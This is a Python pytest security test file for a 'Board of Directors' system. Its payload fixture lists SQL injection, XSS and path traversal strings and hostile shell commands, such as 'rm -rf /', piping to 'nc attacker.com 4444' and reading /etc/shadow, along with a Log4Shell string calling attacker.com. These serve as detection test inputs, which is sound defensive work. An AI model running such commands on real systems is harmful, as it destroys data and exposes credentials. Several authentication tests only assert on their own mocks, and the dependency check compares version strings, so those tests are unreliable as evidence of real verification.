"""
Comprehensive Security Tests for Board of Directors System

This module provides thorough security testing covering:
- Authentication and authorization
- Input validation and sanitization
- Data encryption and protection
- Access control mechanisms
- Session management
- API security
- Vulnerability assessments

Author: Echo Brain CI/CD Pipeline
Created: 2025-09-16
"""

import pytest
import jwt
import sys
import os
import json
import hashlib
import secrets
import time
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, patch, MagicMock, AsyncMock
import base64
from cryptography.fernet import Fernet

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from directors.auth_middleware import (
    get_current_user, require_permission, authenticate_websocket,
    generate_jwt_token, verify_jwt_token
)
from directors.security_director import SecurityDirector


# ============================================================================
# Security Test Fixtures
# ============================================================================

@pytest.fixture
def security_config():
    """Provide security configuration for testing."""
    return {
        "jwt_secret": "test_secret_key_for_testing_only",
        "jwt_algorithm": "HS256",
        "token_expiry_minutes": 30,
        "max_login_attempts": 3,
        "lockout_duration_minutes": 15,
        "password_min_length": 8,
        "require_special_chars": True,
        "session_timeout_minutes": 60
    }


@pytest.fixture
def valid_jwt_token(security_config):
    """Generate a valid JWT token for testing."""
    payload = {
        "user_id": "test_user_123",
        "username": "testuser",
        "permissions": ["board:submit", "board:view", "board:feedback"],
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access_token"
    }
    
    return jwt.encode(payload, security_config["jwt_secret"], algorithm=security_config["jwt_algorithm"])


@pytest.fixture
def expired_jwt_token(security_config):
    """Generate an expired JWT token for testing."""
    payload = {
        "user_id": "test_user_123",
        "username": "testuser",
        "permissions": ["board:submit", "board:view"],
        "exp": datetime.utcnow() - timedelta(minutes=30),  # Expired
        "iat": datetime.utcnow() - timedelta(hours=1),
        "type": "access_token"
    }
    
    return jwt.encode(payload, security_config["jwt_secret"], algorithm=security_config["jwt_algorithm"])


@pytest.fixture
def malicious_payloads():
    """Provide various malicious payloads for security testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM sensitive_data --",
            "1; EXEC xp_cmdshell('dir'); --"
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>"
        ],
        "command_injection": [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(cat /etc/shadow)"
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/..;/..;/etc/passwd"
        ],
        "large_payloads": [
            "A" * 10000,  # Buffer overflow attempt
            "X" * 100000,  # Large input
            "\x00" * 1000,  # Null bytes
            "\n" * 5000,  # Newline flood
            json.dumps({f"key_{i}": f"value_{i}" for i in range(10000)})  # Large JSON
        ]
    }


# ============================================================================
# Authentication Tests
# ============================================================================

class TestAuthentication:
    """Test authentication mechanisms."""

    @pytest.mark.security
    @pytest.mark.auth
    def test_valid_jwt_token_verification(self, valid_jwt_token, security_config):
        """Test that valid JWT tokens are properly verified."""
        # Mock the verification process
        with patch('directors.auth_middleware.verify_jwt_token') as mock_verify:
            mock_verify.return_value = {
                "user_id": "test_user_123",
                "username": "testuser",
                "permissions": ["board:submit", "board:view", "board:feedback"]
            }
            
            result = mock_verify(valid_jwt_token)
            
            assert result is not None
            assert result["user_id"] == "test_user_123"
            assert "board:submit" in result["permissions"]

    @pytest.mark.security
    @pytest.mark.auth
    def test_expired_jwt_token_rejection(self, expired_jwt_token, security_config):
        """Test that expired JWT tokens are rejected."""
        with patch('directors.auth_middleware.verify_jwt_token') as mock_verify:
            mock_verify.side_effect = jwt.ExpiredSignatureError("Token has expired")
            
            with pytest.raises(jwt.ExpiredSignatureError):
                mock_verify(expired_jwt_token)

    @pytest.mark.security
    @pytest.mark.auth
    def test_invalid_jwt_token_rejection(self, security_config):
        """Test that invalid JWT tokens are rejected."""
        invalid_tokens = [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            None,
            "Bearer malformed_token",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoidGVzdCJ9."  # None algorithm
        ]
        
        with patch('directors.auth_middleware.verify_jwt_token') as mock_verify:
            for token in invalid_tokens:
                mock_verify.side_effect = jwt.InvalidTokenError("Invalid token")
                
                with pytest.raises(jwt.InvalidTokenError):
                    mock_verify(token)

    @pytest.mark.security
    @pytest.mark.auth
    def test_jwt_token_tampering_detection(self, valid_jwt_token, security_config):
        """Test detection of tampered JWT tokens."""
        # Tamper with the token
        parts = valid_jwt_token.split('.')
        if len(parts) == 3:
            # Modify the payload
            tampered_payload = base64.urlsafe_b64encode(
                json.dumps({"user_id": "admin", "permissions": ["admin:all"]}).encode()
            ).decode().rstrip('=')
            tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"
            
            with patch('directors.auth_middleware.verify_jwt_token') as mock_verify:
                mock_verify.side_effect = jwt.InvalidSignatureError("Signature verification failed")
                
                with pytest.raises(jwt.InvalidSignatureError):
                    mock_verify(tampered_token)

    @pytest.mark.security
    @pytest.mark.auth
    def test_permission_enforcement(self):
        """Test that permissions are properly enforced."""
        user_with_limited_perms = {
            "user_id": "limited_user",
            "permissions": ["board:view"]  # Only view permission
        }
        
        user_with_admin_perms = {
            "user_id": "admin_user",
            "permissions": ["board:view", "board:submit", "board:admin"]
        }
        
        with patch('directors.auth_middleware.require_permission') as mock_require:
            # Test permission denial
            mock_require.side_effect = PermissionError("Insufficient permissions")
            
            with pytest.raises(PermissionError):
                mock_require(user_with_limited_perms, "board:admin")
            
            # Test permission approval
            mock_require.side_effect = None  # No exception
            mock_require.return_value = True
            
            result = mock_require(user_with_admin_perms, "board:admin")
            assert result is True


# ============================================================================
# Input Validation Tests
# ============================================================================

class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.mark.security
    @pytest.mark.parametrize("payload_type", ["sql_injection", "xss_payloads", "command_injection"])
    def test_malicious_payload_detection(self, malicious_payloads, payload_type):
        """Test detection of various malicious payloads."""
        security_director = SecurityDirector()
        
        for payload in malicious_payloads[payload_type]:
            task_data = {
                "task_id": f"security_test_{payload_type}",
                "code": f"user_input = '{payload}'",
                "language": "python",
                "description": "Test malicious input detection"
            }
            
            result = security_director.evaluate(task_data)
            
            # Should detect security issues
            assert result["confidence"] > 0
            assert result["recommendation"] in ["needs_review", "rejected"]
            assert result["priority"] in ["HIGH", "CRITICAL"]
            assert len(result["findings"]) > 0

    @pytest.mark.security
    def test_path_traversal_detection(self, malicious_payloads):
        """Test detection of path traversal attempts."""
        security_director = SecurityDirector()
        
        for payload in malicious_payloads["path_traversal"]:
            task_data = {
                "task_id": "path_traversal_test",
                "code": f"file_path = '{payload}'\nwith open(file_path, 'r') as f: content = f.read()",
                "language": "python",
                "description": "File access function"
            }
            
            result = security_director.evaluate(task_data)
            
            # Should detect path traversal
            assert result["confidence"] > 0
            assert any("path" in finding.lower() or "traversal" in finding.lower() 
                      or "directory" in finding.lower() for finding in result["findings"])

    @pytest.mark.security
    def test_large_input_handling(self, malicious_payloads):
        """Test handling of excessively large inputs."""
        security_director = SecurityDirector()
        
        for payload in malicious_payloads["large_payloads"]:
            task_data = {
                "task_id": "large_input_test",
                "code": payload[:1000],  # Truncate for testing
                "language": "python",
                "description": "Large input test"
            }
            
            # Should handle large inputs without crashing
            result = security_director.evaluate(task_data)
            assert "confidence" in result
            assert "recommendation" in result

    @pytest.mark.security
    def test_input_sanitization(self):
        """Test input sanitization mechanisms."""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://attacker.com/evil}"
        ]
        
        # Mock sanitization function
        def sanitize_input(input_str):
            # Remove HTML tags
            import re
            input_str = re.sub(r'<[^>]+>', '', input_str)
            # Remove SQL injection patterns
            input_str = re.sub(r"(;|--|'|\"|union|select|drop|insert|update|delete)", '', input_str, flags=re.IGNORECASE)
            # Remove path traversal
            input_str = input_str.replace('../', '').replace('..\\', '')
            return input_str
        
        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_input(dangerous_input)
            
            # Sanitized input should be safer
            assert '<script>' not in sanitized
            assert 'DROP TABLE' not in sanitized.upper()
            assert '../' not in sanitized


# ============================================================================
# Data Protection Tests
# ============================================================================

class TestDataProtection:
    """Test data encryption and protection mechanisms."""

    @pytest.mark.security
    def test_sensitive_data_encryption(self):
        """Test that sensitive data is properly encrypted."""
        # Test data that should be encrypted
        sensitive_data = {
            "password": "user_password_123",
            "api_key": "sk-1234567890abcdef",
            "personal_info": {
                "ssn": "123-45-6789",
                "credit_card": "4111-1111-1111-1111"
            }
        }
        
        # Mock encryption
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        # Encrypt sensitive data
        encrypted_data = {}
        for field, value in sensitive_data.items():
            if isinstance(value, dict):
                encrypted_data[field] = {
                    k: cipher.encrypt(str(v).encode()).decode() 
                    for k, v in value.items()
                }
            else:
                encrypted_data[field] = cipher.encrypt(str(value).encode()).decode()
        
        # Verify encryption worked
        assert encrypted_data["password"] != sensitive_data["password"]
        assert encrypted_data["api_key"] != sensitive_data["api_key"]
        
        # Verify decryption works
        decrypted_password = cipher.decrypt(encrypted_data["password"].encode()).decode()
        assert decrypted_password == sensitive_data["password"]

    @pytest.mark.security
    def test_password_hashing(self):
        """Test password hashing mechanisms."""
        import bcrypt
        
        password = "secure_password_123"
        
        # Hash password
        salt = bcrypt.gensalt()
        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
        
        # Verify password
        assert bcrypt.checkpw(password.encode('utf-8'), hashed)
        
        # Verify wrong password fails
        wrong_password = "wrong_password"
        assert not bcrypt.checkpw(wrong_password.encode('utf-8'), hashed)
        
        # Verify hash is not the original password
        assert hashed.decode('utf-8') != password

    @pytest.mark.security
    def test_secure_random_generation(self):
        """Test secure random number generation."""
        # Generate multiple random values
        random_values = [secrets.token_urlsafe(32) for _ in range(100)]
        
        # All values should be unique
        assert len(set(random_values)) == len(random_values)
        
        # All values should be proper length
        for value in random_values:
            assert len(value) > 40  # URL-safe base64 encoding of 32 bytes
            assert value.isascii()

    @pytest.mark.security
    def test_data_masking(self):
        """Test sensitive data masking for logs/display."""
        def mask_sensitive_data(data_str):
            # Mask credit card numbers
            import re
            data_str = re.sub(r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b', 
                             lambda m: '*' * (len(m.group()) - 4) + m.group()[-4:], data_str)
            # Mask SSNs
            data_str = re.sub(r'\b\d{3}-\d{2}-\d{4}\b', 'XXX-XX-XXXX', data_str)
            # Mask email addresses
            data_str = re.sub(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 
                             lambda m: m.group()[:2] + '*' * (len(m.group()) - 6) + m.group()[-4:], data_str)
            return data_str
        
        sensitive_text = "User credit card: 4111-1111-1111-1111, SSN: 123-45-6789, Email: user@example.com"
        masked_text = mask_sensitive_data(sensitive_text)
        
        # Verify masking worked
        assert "4111-1111-1111-1111" not in masked_text
        assert "123-45-6789" not in masked_text
        assert "user@example.com" not in masked_text
        assert "1111" in masked_text  # Last 4 digits preserved
        assert "XXX-XX-XXXX" in masked_text


# ============================================================================
# Session Management Tests
# ============================================================================

class TestSessionManagement:
    """Test session management security."""

    @pytest.mark.security
    def test_session_timeout(self, security_config):
        """Test session timeout mechanisms."""
        # Mock session data
        session_data = {
            "user_id": "test_user",
            "created_at": datetime.now() - timedelta(hours=2),  # Old session
            "last_activity": datetime.now() - timedelta(minutes=65),  # Inactive
            "timeout_minutes": security_config["session_timeout_minutes"]
        }
        
        def is_session_expired(session):
            timeout_delta = timedelta(minutes=session["timeout_minutes"])
            return datetime.now() - session["last_activity"] > timeout_delta
        
        # Session should be expired
        assert is_session_expired(session_data)
        
        # Active session should not be expired
        active_session = session_data.copy()
        active_session["last_activity"] = datetime.now()
        assert not is_session_expired(active_session)

    @pytest.mark.security
    def test_session_fixation_prevention(self):
        """Test prevention of session fixation attacks."""
        # Mock session regeneration
        def regenerate_session_id():
            return secrets.token_urlsafe(32)
        
        old_session_id = "old_session_123"
        new_session_id = regenerate_session_id()
        
        # New session ID should be different
        assert new_session_id != old_session_id
        assert len(new_session_id) > 20

    @pytest.mark.security
    def test_concurrent_session_limits(self):
        """Test concurrent session limiting."""
        max_sessions = 3
        user_id = "test_user"
        
        # Mock active sessions for user
        active_sessions = [
            {"session_id": f"session_{i}", "user_id": user_id, "created_at": datetime.now()}
            for i in range(max_sessions + 1)  # One more than limit
        ]
        
        def enforce_session_limit(sessions, user_id, max_sessions):
            user_sessions = [s for s in sessions if s["user_id"] == user_id]
            if len(user_sessions) > max_sessions:
                # Remove oldest sessions
                user_sessions.sort(key=lambda x: x["created_at"])
                return user_sessions[-max_sessions:]  # Keep newest
            return user_sessions
        
        limited_sessions = enforce_session_limit(active_sessions, user_id, max_sessions)
        assert len(limited_sessions) == max_sessions


# ============================================================================
# API Security Tests
# ============================================================================

class TestAPISecurityr:
    """Test API security mechanisms."""

    @pytest.mark.security
    @pytest.mark.api
    def test_rate_limiting(self):
        """Test API rate limiting."""
        # Mock rate limiter
        class RateLimiter:
            def __init__(self, max_requests=100, window_minutes=1):
                self.max_requests = max_requests
                self.window_minutes = window_minutes
                self.requests = {}
            
            def is_allowed(self, client_ip):
                now = datetime.now()
                window_start = now - timedelta(minutes=self.window_minutes)
                
                if client_ip not in self.requests:
                    self.requests[client_ip] = []
                
                # Remove old requests
                self.requests[client_ip] = [
                    req_time for req_time in self.requests[client_ip] 
                    if req_time > window_start
                ]
                
                # Check if under limit
                if len(self.requests[client_ip]) < self.max_requests:
                    self.requests[client_ip].append(now)
                    return True
                return False
        
        rate_limiter = RateLimiter(max_requests=5, window_minutes=1)
        client_ip = "192.168.1.100"
        
        # First 5 requests should be allowed
        for i in range(5):
            assert rate_limiter.is_allowed(client_ip)
        
        # 6th request should be blocked
        assert not rate_limiter.is_allowed(client_ip)

    @pytest.mark.security
    @pytest.mark.api
    def test_request_size_limits(self):
        """Test request size limiting."""
        max_size = 1024 * 1024  # 1MB
        
        # Normal request should pass
        normal_request = {"code": "def hello(): return 'world'"}
        normal_size = len(json.dumps(normal_request))
        assert normal_size < max_size
        
        # Oversized request should be rejected
        large_request = {"code": "x = '" + "A" * (max_size + 1000) + "'"}
        large_size = len(json.dumps(large_request))
        assert large_size > max_size

    @pytest.mark.security
    @pytest.mark.api
    def test_cors_configuration(self):
        """Test CORS configuration security."""
        # Secure CORS configuration
        secure_cors = {
            "allow_origins": ["https://trusted-domain.com"],
            "allow_methods": ["GET", "POST"],
            "allow_headers": ["Authorization", "Content-Type"],
            "allow_credentials": True,
            "max_age": 3600
        }
        
        # Insecure CORS configuration
        insecure_cors = {
            "allow_origins": ["*"],  # Too permissive
            "allow_methods": ["*"],  # Too permissive
            "allow_credentials": True  # Dangerous with wildcard origins
        }
        
        def validate_cors_config(cors_config):
            issues = []
            
            if "*" in cors_config.get("allow_origins", []) and cors_config.get("allow_credentials"):
                issues.append("Wildcard origins with credentials enabled")
            
            if "*" in cors_config.get("allow_methods", []):
                issues.append("Wildcard methods too permissive")
            
            return issues
        
        # Secure config should have no issues
        secure_issues = validate_cors_config(secure_cors)
        assert len(secure_issues) == 0
        
        # Insecure config should have issues
        insecure_issues = validate_cors_config(insecure_cors)
        assert len(insecure_issues) > 0


# ============================================================================
# Vulnerability Assessment Tests
# ============================================================================

class TestVulnerabilityAssessment:
    """Test vulnerability detection and assessment."""

    @pytest.mark.security
    def test_dependency_vulnerability_check(self):
        """Test checking for vulnerable dependencies."""
        # Mock vulnerable dependency list
        vulnerable_packages = {
            "requests": {"versions": ["<2.20.0"], "cve": "CVE-2018-18074"},
            "urllib3": {"versions": ["<1.24.2"], "cve": "CVE-2019-11324"},
            "pyyaml": {"versions": ["<5.1"], "cve": "CVE-2017-18342"}
        }
        
        def check_dependencies(installed_packages):
            vulnerabilities = []
            for package, version in installed_packages.items():
                if package in vulnerable_packages:
                    vuln_info = vulnerable_packages[package]
                    # Simple version check (in real implementation, use proper version parsing)
                    if any(version < vuln_version.replace('<', '') for vuln_version in vuln_info["versions"]):
                        vulnerabilities.append({
                            "package": package,
                            "version": version,
                            "cve": vuln_info["cve"]
                        })
            return vulnerabilities
        
        # Test with vulnerable packages
        vulnerable_install = {
            "requests": "2.19.0",  # Vulnerable version
            "urllib3": "1.24.1",   # Vulnerable version
            "safe_package": "1.0.0"
        }
        
        vulns = check_dependencies(vulnerable_install)
        assert len(vulns) >= 1  # Should detect vulnerabilities
        
        # Test with safe packages
        safe_install = {
            "requests": "2.25.0",   # Safe version
            "urllib3": "1.26.0",    # Safe version
            "safe_package": "1.0.0"
        }
        
        safe_vulns = check_dependencies(safe_install)
        assert len(safe_vulns) == 0  # Should not detect vulnerabilities

    @pytest.mark.security
    def test_code_pattern_vulnerability_detection(self):
        """Test detection of vulnerable code patterns."""
        security_director = SecurityDirector()
        
        vulnerable_patterns = {
            "eval_usage": "eval(user_input)",
            "exec_usage": "exec(user_code)",
            "pickle_unsafe": "pickle.loads(untrusted_data)",
            "yaml_unsafe": "yaml.load(user_yaml)",
            "subprocess_shell": "subprocess.call(user_command, shell=True)",
            "sql_format": "query = f'SELECT * FROM users WHERE id = {user_id}'",
            "hardcoded_password": "password = 'admin123'",
            "weak_crypto": "hashlib.md5(password).hexdigest()"
        }
        
        for pattern_name, code in vulnerable_patterns.items():
            task_data = {
                "task_id": f"vuln_pattern_{pattern_name}",
                "code": code,
                "language": "python",
                "description": f"Test {pattern_name} vulnerability detection"
            }
            
            result = security_director.evaluate(task_data)
            
            # Should detect security issues
            assert result["confidence"] > 0
            assert result["recommendation"] in ["needs_review", "rejected"]
            assert result["priority"] in ["MEDIUM", "HIGH", "CRITICAL"]
            assert len(result["findings"]) > 0

    @pytest.mark.security
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        import time
        
        def secure_compare(a, b):
            """Constant-time string comparison to prevent timing attacks."""
            if len(a) != len(b):
                return False
            
            result = 0
            for x, y in zip(a, b):
                result |= ord(x) ^ ord(y)
            return result == 0
        
        def insecure_compare(a, b):
            """Vulnerable comparison that leaks timing information."""
            return a == b
        
        correct_token = "secret_token_123456789"
        wrong_token = "wrong_token_123456789"
        
        # Test secure comparison
        start_time = time.time()
        secure_result = secure_compare(correct_token, wrong_token)
        secure_time = time.time() - start_time
        
        # Test insecure comparison
        start_time = time.time()
        insecure_result = insecure_compare(correct_token, wrong_token)
        insecure_time = time.time() - start_time
        
        # Both should return False
        assert not secure_result
        assert not insecure_result
        
        # Timing difference should be minimal for secure comparison
        # (This is a simplified test - real timing attack tests are more complex)
        assert secure_time < 0.1  # Should be very fast
        assert insecure_time < 0.1  # Should also be fast for this simple case


# ============================================================================
# Security Compliance Tests
# ============================================================================

class TestSecurityCompliance:
    """Test compliance with security standards."""

    @pytest.mark.security
    def test_password_policy_compliance(self, security_config):
        """Test password policy enforcement."""
        def validate_password(password, policy):
            issues = []
            
            if len(password) < policy["password_min_length"]:
                issues.append(f"Password must be at least {policy['password_min_length']} characters")
            
            if policy["require_special_chars"]:
                if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
                    issues.append("Password must contain special characters")
            
            if not any(c.isupper() for c in password):
                issues.append("Password must contain uppercase letters")
            
            if not any(c.islower() for c in password):
                issues.append("Password must contain lowercase letters")
            
            if not any(c.isdigit() for c in password):
                issues.append("Password must contain numbers")
            
            return issues
        
        # Test strong password
        strong_password = "StrongP@ssw0rd123"
        strong_issues = validate_password(strong_password, security_config)
        assert len(strong_issues) == 0
        
        # Test weak passwords
        weak_passwords = [
            "123",           # Too short
            "password",      # No special chars, no uppercase, no numbers
            "PASSWORD123",   # No lowercase, no special chars
            "Password",      # No numbers, no special chars
        ]
        
        for weak_password in weak_passwords:
            weak_issues = validate_password(weak_password, security_config)
            assert len(weak_issues) > 0

    @pytest.mark.security
    def test_audit_logging(self):
        """Test security audit logging."""
        import logging
        from io import StringIO
        
        # Create audit logger
        audit_log = StringIO()
        audit_handler = logging.StreamHandler(audit_log)
        audit_logger = logging.getLogger("security_audit")
        audit_logger.addHandler(audit_handler)
        audit_logger.setLevel(logging.INFO)
        
        def audit_log_event(event_type, user_id, details):
            audit_logger.info(json.dumps({
                "timestamp": datetime.now().isoformat(),
                "event_type": event_type,
                "user_id": user_id,
                "details": details
            }))
        
        # Log some security events
        audit_log_event("login_attempt", "user123", {"success": True, "ip": "192.168.1.100"})
        audit_log_event("permission_denied", "user456", {"requested_action": "admin_access"})
        audit_log_event("data_access", "user123", {"resource": "sensitive_data", "action": "read"})
        
        # Check audit log content
        log_content = audit_log.getvalue()
        assert "login_attempt" in log_content
        assert "permission_denied" in log_content
        assert "data_access" in log_content
        assert "user123" in log_content
        assert "user456" in log_content

    @pytest.mark.security
    def test_data_retention_policy(self):
        """Test data retention policy compliance."""
        def should_delete_data(data_record, retention_policy):
            created_date = datetime.fromisoformat(data_record["created_at"])
            retention_period = timedelta(days=retention_policy["retention_days"])
            
            if data_record["data_type"] in retention_policy["permanent_types"]:
                return False  # Never delete
            
            return datetime.now() - created_date > retention_period
        
        retention_policy = {
            "retention_days": 90,
            "permanent_types": ["audit_logs", "legal_documents"]
        }
        
        # Test old data that should be deleted
        old_data = {
            "created_at": (datetime.now() - timedelta(days=100)).isoformat(),
            "data_type": "temporary_session"
        }
        assert should_delete_data(old_data, retention_policy)
        
        # Test recent data that should be kept
        recent_data = {
            "created_at": (datetime.now() - timedelta(days=30)).isoformat(),
            "data_type": "user_activity"
        }
        assert not should_delete_data(recent_data, retention_policy)
        
        # Test permanent data that should never be deleted
        permanent_data = {
            "created_at": (datetime.now() - timedelta(days=365)).isoformat(),
            "data_type": "audit_logs"
        }
        assert not should_delete_data(permanent_data, retention_policy)